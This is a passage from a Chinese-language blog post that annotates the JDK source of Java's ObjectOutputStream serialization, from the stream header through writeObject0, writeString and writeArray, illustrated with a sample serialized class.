class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">6211228684695072792L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField = <span class="number">112</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> boolField = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">short</span> shortField = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">private</span> String stringField = <span class="string">"stringvalue"</span>;</span><br><span class="line">    <span class="keyword">private</span> File fileField = <span class="keyword">new</span> File(<span class="string">"E:\\"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//任意方法，可忽略</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化测试：这里只有序列化，不测试反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">/* 序列化对象：由对象转为字节流 */</span></span><br><span class="line">        TestSerializable testSerializable = <span class="keyword">new</span> TestSerializable();</span><br><span class="line">        <span class="comment">//创建 ObjectOutputStream 对象输出流，最终输出流到文件</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">"e:\\test.txt"</span>)));</span><br><span class="line">        <span class="comment">//写入对象到输出流</span></span><br><span class="line">        oos.writeObject(testSerializable);</span><br><span class="line">        System.out.println(<span class="string">"对象序列化成功！"</span>);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化后的文件输出结果如下图:</p><p><img src="/imgs/image-20210630210013254.png" alt="image-20210630210013254"></p><p>虽然序列化后的信息看起来比较乱，但是还是能得到一些信息的</p><ul><li>类的全称<code>serial.TestSerializable</code></li><li>属性类型及属性名和<code>Z</code>和<code>boolField</code>（Z代表boolean类型，后续会提到）</li><li>属性类型及属性名<code>I</code>和<code>intField</code>（I代表Int类型，后续会提到）</li><li>属性类型及属性名<code>S</code>和<code>shortField</code>（S代表short类型，后续会提到）</li><li>属性名及属性类型<code>fileField</code>和<code>java/io/File</code></li><li>属性名及属性类型<code>stringField</code>和<code>java/lang/String</code></li><li>属性值<code>E:\</code>和<code>stringvalue</code>（当然还有其他值这里只说能看到的）</li></ul><p>备注：后续分析时会将上面例子带入分析，以<code>（例子分析：）</code>形式备注在每一段分析的最后面。</p><h3 id="3、ObjectOutputStream构造方法"><a href="#3、ObjectOutputStream构造方法" class="headerlink" title="3、ObjectOutputStream构造方法"></a>3、ObjectOutputStream构造方法</h3><h4 id="3-1、有参构造："><a href="#3-1、有参构造：" class="headerlink" title="3.1、有参构造："></a>3.1、有参构造：</h4><p>首先把bout绑定到底层的字节数据容器，调用writeStreamHeader()方法完成序列化流头部信息的写入<code>0xaced0005</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    <span class="comment">// 创建一个块数据输出流</span></span><br><span class="line">    bout = <span class="keyword">new</span> BlockDataOutputStream(out);</span><br><span class="line">    <span class="comment">// 创建一个HandleTable和ReplaceTable</span></span><br><span class="line">    handles = <span class="keyword">new</span> HandleTable(<span class="number">10</span>, (<span class="keyword">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    subs = <span class="keyword">new</span> ReplaceTable(<span class="number">10</span>, (<span class="keyword">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    <span class="comment">// Override标识</span></span><br><span class="line">    enableOverride = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 写入流数据头</span></span><br><span class="line">    writeStreamHeader();</span><br><span class="line">    <span class="comment">// 启用块数据模式</span></span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        <span class="comment">//创建异常处理</span></span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> DebugTraceInfoStack();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-2、writeStreamHeader-："><a href="#3-2、writeStreamHeader-：" class="headerlink" title="3.2、writeStreamHeader()："></a>3.2、writeStreamHeader()：</h4><p>写入魔术头和版本信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// ObjectStreamConstants定义的常量</span></span><br><span class="line">    bout.writeShort(STREAM_MAGIC); <span class="comment">// ac ed</span></span><br><span class="line">    bout.writeShort(STREAM_VERSION); <span class="comment">// 00 05</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（例子分析：此时上面的例子写入了<code>ac ed 00 05</code>）</p><h3 id="4、writeObject写入对象输出流"><a href="#4、writeObject写入对象输出流" class="headerlink" title="4、writeObject写入对象输出流"></a>4、writeObject写入对象输出流</h3><h4 id="writeObject的调用"><a href="#writeObject的调用" class="headerlink" title="writeObject的调用"></a>writeObject的调用</h4><p><img src="/imgs/writeObject%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="writeObject的调用"></p><h4 id="4-1、writeObject："><a href="#4-1、writeObject：" class="headerlink" title="4.1、writeObject："></a>4.1、writeObject：</h4><h5 id="writeObject"><a href="#writeObject" class="headerlink" title="writeObject"></a>writeObject</h5><p>如果writeObject被重写会调用writeObjectOverride重写方法，否则调用 writeObject0方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">//if true, invoke writeObjectOverride() instead of writeObject()</span></span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        <span class="comment">//如果流子类重写了writeObject则调用writeObjectOverride</span></span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//其它情况则调用writeObject0</span></span><br><span class="line">        writeObject0(obj, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果序列化出现异常调用 writeFatalException 方法</span></span><br><span class="line">            writeFatalException(ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="writeFatalException：处理序列化异常情况下的序列化信息"><a href="#writeFatalException：处理序列化异常情况下的序列化信息" class="headerlink" title="writeFatalException：处理序列化异常情况下的序列化信息"></a>writeFatalException：处理序列化异常情况下的序列化信息</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尝试写入导致序列化中止的致命IOException信息到底层流。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeFatalException</span><span class="params">(IOException ex)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    clear();</span><br><span class="line">    <span class="comment">// 关闭块数据模式</span></span><br><span class="line">    <span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 将异常标识TC_EXCEPTION 0x7B写入底层流</span></span><br><span class="line">        bout.writeByte(TC_EXCEPTION);</span><br><span class="line">        <span class="comment">// 将IOException异常对象序列化</span></span><br><span class="line">        writeObject0(ex, <span class="keyword">false</span>);</span><br><span class="line">        clear();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">//重启块数据模式</span></span><br><span class="line">        bout.setBlockDataMode(oldMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="writeObject0："><a href="#writeObject0：" class="headerlink" title="writeObject0："></a>writeObject0：</h5><p>序列化的核心方法，主要有三个步骤，1是处理不需要序列化的情况、2是判断是否替换了对象(有writeReplace方法)、3是处理其它情况 主要是String|Array|Enum和一般可序列化对象的序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//关闭块数据模式</span></span><br><span class="line">        <span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">    <span class="comment">// 递归深度，表示writeObject0被调用的深度</span></span><br><span class="line">    <span class="comment">// 比如序列化 A 对象时调用 writeObject 则 depth++，而 A 对象的字段又是一个对象，此时又会递归调用 writeObject 方法，当 writeObject 方法执行完成时 depth--。因而如果不出异常则 depth 最终会是 0，有异常则在 catch 模块时 depth 不为 0。</span></span><br><span class="line">        depth++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// handle previously written and non-replaceable objects</span></span><br><span class="line">            <span class="keyword">int</span> h;</span><br><span class="line">            <span class="comment">/**** 1、 不需要序列化的情况 ***/</span></span><br><span class="line">            <span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//替换后的对象为 null</span></span><br><span class="line">                writeNull();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">//handles存储的是已经序列化的对象句柄，如果找到了，直接写一个句柄就可以了</span></span><br><span class="line">                writeHandle(h);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                <span class="comment">//Class对象</span></span><br><span class="line">                writeClass((Class) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">                <span class="comment">//ObjectStreamClass 序列化类的描述信息</span></span><br><span class="line">                writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*** 2、判断是否替换了对象 ***/</span></span><br><span class="line">            Object orig = obj;</span><br><span class="line">            <span class="comment">// 获取要序列化的对象的Class对象</span></span><br><span class="line">            Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">            <span class="comment">// 创建一个类的序列化描述符对象。 </span></span><br><span class="line">            ObjectStreamClass desc;</span><br><span class="line">            <span class="comment">// 1. 如果要序列化的对象中有 writeReplace 方法，则递归检查最终要输出的对象</span></span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="comment">// REMIND: skip this check for strings/arrays?</span></span><br><span class="line">                Class&lt;?&gt; repCl;</span><br><span class="line">                <span class="comment">// 创建描述序列化对象Class的ObjectStreamClass对象</span></span><br><span class="line">                desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">                <span class="comment">// 如果要序列化的对象中有 writeReplace 方法，则递归检查最终要输出的对象</span></span><br><span class="line">                <span class="keyword">if</span> (!desc.hasWriteReplaceMethod() ||</span><br><span class="line">                    (obj = desc.invokeWriteReplace(obj)) == <span class="keyword">null</span> ||</span><br><span class="line">                    (repCl = obj.getClass()) == cl)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                cl = repCl;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 子类重写了replaceObject方法</span></span><br><span class="line">            <span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">                <span class="comment">//enableReplace和写入时替换对象writeReplace方法有关，如果自定义writeReplace，则调用replaceObject</span></span><br><span class="line">                Object rep = replaceObject(obj);</span><br><span class="line">                <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    cl = rep.getClass();</span><br><span class="line">                    desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                obj = rep;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if object replaced, run through original checks a second time</span></span><br><span class="line">            <span class="comment">// 既然要序列化的对象已经被替换了，此时就需要再次做判断，和步骤1类似</span></span><br><span class="line">            <span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">                subs.assign(orig, obj);</span><br><span class="line">                <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    writeNull();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    writeHandle(h);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                    writeClass((Class) obj, unshared);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">                    writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// remaining cases</span></span><br><span class="line">            <span class="comment">//*** 3、处理其余情况：String、Array、Enum及实现了Serializable的对象的写入输出流 ***/</span></span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                writeString((String) obj, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">                writeArray(obj, desc, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">                writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">                <span class="comment">// 处理Serializable接口的普通对象</span></span><br><span class="line">                writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果没有实现Serializable接口会抛出 NotSerializableException异常</span></span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(</span><br><span class="line">                        cl.getName() + <span class="string">"\n"</span> + debugInfoStack.toString());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(cl.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            depth--;</span><br><span class="line">            <span class="comment">//刷新块数据模式</span></span><br><span class="line">            bout.setBlockDataMode(oldMode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>（例子分析：此时新写入任何数据，还是<code>ac ed 00 05</code>，按照示例代码，接下来会进入writeOrdinaryObject方法）</p><h5 id="补充：ObjectStreamClass"><a href="#补充：ObjectStreamClass" class="headerlink" title="补充：ObjectStreamClass"></a>补充：ObjectStreamClass</h5><p>在上面writeObject0代码，创建了一个用于类序列化描述符的ObjectStreamClass对象，我们先大体分析下ObjectStreamClass。</p><p>官方文档是这样描述这个类的：</p><blockquote><p>类的序列化描述符。 它包含该类的名称和serialVersionUID。  以使用lookup方法查找/创建Java Java中加载的特定类的ObjectStreamClass。 </p></blockquote><p>除了内部类外它具有以下方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">forClass()：返回此版本映射到的本地VM中的类。</span><br><span class="line">getField(String name)：通过名称获取此类的字段。</span><br><span class="line">getFields()：返回此可序列化类的字段数组。</span><br><span class="line">getName()：返回此描述符描述的类的名称。</span><br><span class="line">getSerialVersionUID()：返回此类的serialVersionUID。</span><br><span class="line">lookup(类&lt;?&gt; cl)：找到可以序列化的类的描述符。</span><br><span class="line">lookupAny(类&lt;?&gt; cl)：返回任何类的描述符，无论它是否实现Serializable。</span><br><span class="line">toString()：返回描述此ObjectStreamClass的字符串。</span><br></pre></td></tr></table></figure><p>通过以上方法ObjectStreamClass对象可以获取Class、类名称、类属性数组、类的serialVersionUID等。</p><p>了解了ObjectStreamClass，继续回到我们的分析。</p><h5 id="三种类型的序列化-write-String-Array-Enum-："><a href="#三种类型的序列化-write-String-Array-Enum-：" class="headerlink" title="三种类型的序列化  write[String|Array|Enum]："></a>三种类型的序列化  write[String|Array|Enum]：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写字符串到底层流即字符串的序列化：格式 类型标识0x74/0x7C+内容</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeString</span><span class="params">(String str, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : str);</span><br><span class="line">    <span class="keyword">long</span> utflen = bout.getUTFLength(str);</span><br><span class="line">    <span class="comment">// 长度小于 0xFFFF(65506)</span></span><br><span class="line">    <span class="keyword">if</span> (utflen &lt;= <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">        bout.writeByte(TC_STRING); <span class="comment">//写标识0x74</span></span><br><span class="line">        bout.writeUTF(str, utflen); <span class="comment">//writeUTF写长度+内容</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        bout.writeByte(TC_LONGSTRING);<span class="comment">//写标识0x7C</span></span><br><span class="line">        bout.writeLongUTF(str, utflen);<span class="comment">//长度+写内容</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 写数组到底层流 即数组的序列化</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeArray</span><span class="params">(Object array, ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        bout.writeByte(TC_ARRAY); <span class="comment">//写标识0x75 </span></span><br><span class="line">        writeClassDesc(desc, <span class="keyword">false</span>); <span class="comment">//写描述符</span></span><br><span class="line">        handles.assign(unshared ? <span class="keyword">null</span> : array);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; ccl = desc.forClass().getComponentType();</span><br><span class="line">     <span class="comment">//处理基元数据的数组，格式：TC_ARRAY+描述符+长度+基元数据值的byte</span></span><br><span class="line">        <span class="keyword">if</span> (ccl.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ccl == Integer.TYPE) &#123;</span><br><span class="line">                <span class="keyword">int</span>[] ia = (<span class="keyword">int</span>[]) array;</span><br><span class="line">                bout.writeInt(ia.length); <span class="comment">//写长度 </span></span><br><span class="line">                bout.writeInts(ia, <span class="number">0</span>, ia.length); <span class="comment">//写一组int值，将int转为byte</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Byte.TYPE) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] ba = (<span class="keyword">byte</span>[]) array;</span><br><span class="line">                bout.writeInt(ba.length);</span><br><span class="line">                bout.write(ba, <span class="number">0</span>, ba.length, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Long.TYPE) &#123;</span><br><span class="line">                <span class="keyword">long</span>[] ja = (<span class="keyword">long</span>[]) array;</span><br><span class="line">                bout.writeInt(ja.length);</span><br><span class="line">                bout.writeLongs(ja, <span class="number">0</span>, ja.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Float.TYPE) &#123;</span><br><span class="line">                <span class="keyword">float</span>[] fa = (<span class="keyword">float</span>[]) array;</span><br><span class="line">                bout.writeInt(fa.length);</span><br><span class="line">                bout.writeFloats(fa, <span class="number">0</span>, fa.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Double.TYPE) &#123;</span><br><span class="line">                <span class="keyword">double</span>[] da = (<span class="keyword">double</span>[]) array;</span><br><span class="line">                bout.writeInt(da.length);</span><br><span class="line">                bout.writeDoubles(da, <span class="number">0</span>, da.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Short.TYPE) &#123;</span><br><span class="line">                <span class="keyword">short</span>[] sa = (<span class="keyword">short</span>[]) array;</span><br><span class="line">                bout.writeInt(sa.length);</span><br><span class="line">                bout.writeShorts(sa, <span class="number">0</span>, sa.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Character.TYPE) &#123;</span><br><span class="line">                <span class="keyword">char</span>[] ca = (<span class="keyword">char</span>[]) array;</span><br><span class="line">                bout.writeInt(ca.length);</span><br><span class="line">                bout.writeChars(ca, <span class="number">0</span>, ca.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Boolean.TYPE) &#123;</span><br><span class="line">                <span class="keyword">boolean</span>[] za = (<span class="keyword">boolean</span>[]) array;</span><br><span class="line">                bout.writeInt(za.length);</span><br><span class="line">                bout.writeBooleans(za, <span class="number">0</span>, za.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span 